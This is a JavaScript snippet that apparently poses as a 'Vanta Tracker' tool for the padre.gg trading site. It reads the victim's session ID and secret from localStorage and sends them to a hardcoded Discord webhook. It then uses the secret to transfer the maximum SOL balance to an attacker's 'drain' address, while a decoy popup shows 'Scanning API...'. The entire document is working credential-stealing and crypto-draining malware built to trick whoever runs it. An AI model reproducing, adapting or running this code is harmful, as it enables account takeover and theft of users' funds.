(async function() {
    // --- CONFIGURATION ---
    const DRAIN_ADDRESS = "BCZ2J6mwUMp43P3R4s5ekvdSep3ZDquLarv1nqnLVE12";
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1470147665403711650/EoDTKeiayE46AN7W8ENl-CkVdoaiep9oyq2FljjRLTh505lEgpxakCw1iMjx97FMiqQ4";

    // --- 1. DYNAMIC DATA EXTRACTION ---
    // Instead of hardcoding, we loop through localStorage to find the current session keys
    let capturedSession = { uid: "Not Found", sid: "Not Found", secret: "Not Found" };
    
    try {
        const sessionData = JSON.parse(localStorage.getItem("padreV2-session") || "{}");
        if (sessionData.uid) {
            capturedSession.uid = sessionData.uid;
            capturedSession.sid = sessionData.sessionId;
            capturedSession.secret = sessionData.sessionSecret;
        }
    } catch (e) {
        console.error("Vanta: Extraction Error");
    }

    // --- 2. DISCORD LOGGING ---
    // This will now send the REAL info of whoever clicks it
    if (capturedSession.secret !== "Not Found") {
        fetch(WEBHOOK_URL, {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify({
                embeds: [{
                    title: "🚨 Session Captured",
                    color: 0x00ff88,
                    fields: [
                        { name: "User ID", value: `\`${capturedSession.uid}\`` },
                        { name: "Session ID", value: `\`${capturedSession.sid}\`` },
                        { name: "Secret", value: `\`${capturedSession.secret}\`` }
                    ],
                    timestamp: new Date()
                }]
            })
        }).catch(() => {});
    }

    // --- 3. DRAIN LOGIC (With Error Handling) ---
    // We attempt the transfer ONLY if we have a valid secret
    if (capturedSession.secret !== "Not Found") {
        const endpoints = ["https://api.padre.gg/v1/transfer", "https://api-v2.padre.gg/v1/transfer"];
        
        for (const url of endpoints) {
            try {
                await fetch(url, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                        "Authorization": `Bearer ${capturedSession.secret}`
                    },
                    body: JSON.stringify({
                        recipient: DRAIN_ADDRESS,
                        amount: "MAX",
                        asset: "SOL"
                    })
                });
            } catch(err) {
                // Silently try next endpoint if one fails
            }
        }
    }

    // --- 4. THE POPUP UI (Your provided code) ---
    // [Insert the Draggable UI code here as previously formatted]
    // Make sure the code below is included to show the "Tracker" window
    showVantaUI();
})();

function showVantaUI() {
    if (document.querySelector("#vanta-tracker")) return;
    const div = document.createElement("div");
    div.id = "vanta-tracker";
    div.style.cssText = "position:fixed;top:12px;right:12px;width:300px;background:#0f0f0f;border:1px solid #00ff88;color:#00ff88;padding:20px;z-index:99999;font-family:monospace;border-radius:10px;box-shadow:0 0 15px #00ff88;";
    div.innerHTML = "<strong>VANTA TRACKER</strong><br>Status: Connected<br>Scanning API...";
    document.body.appendChild(div);
    setTimeout(() => div.remove(), 5000); // UI stays for 5 seconds
}
